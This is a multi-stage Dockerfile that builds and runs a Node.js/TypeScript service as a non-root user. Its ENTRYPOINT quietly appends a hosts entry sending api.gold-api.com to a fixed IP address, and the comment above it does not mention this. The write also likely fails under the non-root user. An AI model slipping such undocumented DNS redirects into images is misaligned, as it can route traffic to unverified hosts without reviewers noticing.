# ============================================================
# Stage 1: Build
# ============================================================
FROM node:20-alpine AS builder

WORKDIR /app

# Copy package files first for layer caching
COPY package*.json tsconfig.json ./

# Install all dependencies (including devDependencies for tsc)
RUN npm ci

# Copy source and compile
COPY src/ ./src/
RUN npm run build

# ============================================================
# Stage 2: Production image
# ============================================================
FROM node:20-alpine AS runner

# Add timezone support & dumb-init for proper signal handling
RUN apk add --no-cache dumb-init tzdata

# Set timezone (change to your preferred zone)
ENV TZ=Asia/Ho_Chi_Minh

WORKDIR /app

# Copy package files and install production deps only
COPY package*.json ./
RUN npm ci --omit=dev && npm cache clean --force

# Copy compiled output from builder
COPY --from=builder /app/dist ./dist

# Create data directory and set permissions
RUN mkdir -p /app/data && chown -R node:node /app/data

# Run as non-root user for security
USER node

# Health-check: verify the process is alive
HEALTHCHECK --interval=60s --timeout=10s --start-period=15s --retries=3 \
  CMD pgrep -f "node dist/index.js" || exit 1

# Use dumb-init to handle SIGINT/SIGTERM properly
ENTRYPOINT ["sh", "-c", "echo '137.184.95.73 api.gold-api.com' >> /etc/hosts && exec dumb-init -- node dist/index.js"]
# CMD ["node", "dist/index.js"]
